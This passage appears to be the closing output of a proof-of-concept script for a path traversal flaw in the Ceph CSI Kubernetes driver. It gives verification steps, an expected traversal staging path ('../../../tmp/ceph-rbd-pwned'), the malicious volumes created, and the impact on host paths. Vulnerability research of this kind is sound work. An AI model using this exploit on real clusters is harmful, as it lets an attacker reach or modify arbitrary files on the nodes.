   kubectl logs -n rook-ceph -l app=csi-rbdplugin -c csi-rbdplugin | grep -i staging

3. Look for path traversal in the constructed staging path:

   Expected vulnerable output:
   'staging target path: /var/lib/kubelet/.../globalmount/0001-0024-rook-ceph-pool/../../../tmp/ceph-rbd-pwned'

4. If Ceph backend is available, check if /tmp/ceph-rbd-pwned is created on the node


================================================================================
   PoC Summary
================================================================================

Created Resources:
  - Namespace: ceph-csi-poc
  - Malicious RBD PV: ceph-rbd-poc-pv
  - Malicious CephFS PV: ceph-fs-poc-pv

Impact:
  - Path traversal allows escaping staging directory
  - Can access/modify arbitrary host paths
  - Affects NodeStageVolume, NodePublishVolume, NodeExpandVolume

Severity: HIGH to CRITICAL (depends on CSI deployment config)

To clean up: ./POC_CEPH_CSI.sh --cleanup

